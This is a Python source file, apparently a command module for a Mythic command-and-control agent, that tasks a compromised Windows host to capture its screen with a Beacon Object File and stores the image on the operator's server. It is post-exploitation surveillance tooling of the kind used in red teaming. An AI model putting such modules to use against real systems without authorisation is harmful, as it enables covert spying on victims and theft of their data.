from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import logging
import base64

from .Utils.u import *

class ScreenshotArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass

class ScreenshotCommand(CommandBase):
    cmd = "spy-screenshot"
    needs_admin = False
    help_cmd = "spy-screenshot"
    description = \
    """
    Capture the screen and upload the screenshot
    
    Category: Beacon Object File
    """
    version = 1
    author = "@Oblivion"
    argument_class = ScreenshotArguments
    browser_script = BrowserScript(script_name="usf_new", author="@Oblivion", for_new_ui=True)
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        content: bytes = await get_content_by_name("kh_screenshot.x64.o", task.Task.ID)\
        
        task.args.add_arg("bof_file", content.hex())
        task.args.add_arg("bof_id", BF_SCREENSHOT, ParameterType.Number)
                
        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            CommandName="exec-bof",
            TokenID=task.Task.TokenID
        )
  
    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        try:
            if response:
                image_data = bytes.fromhex(response)
                
                file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
                    TaskID=task.Task.ID,
                    FileContents=image_data,
                    Filename=f"screenshot_{task.Task.ID}.bmp",
                    DeleteAfterFetch=False,
                    IsScreenshot=True,
                    IsDownloadFromAgent=True
                ))
                
                if file_resp.Success:
                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                        TaskID=task.Task.ID,
                        Response=f"[+] Screenshot saved as screenshot_{task.Task.ID}.bmp (File ID: {file_resp.AgentFileId})"
                    ))
                else:
                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                        TaskID=task.Task.ID,
                        Response=f"[x] Failed to upload screenshot: {file_resp.Error}"
                    ))

        except Exception as e:
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=task.Task.ID,
                Response=f"[x] Screenshot processing failed: {str(e)}"
            ))
        
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)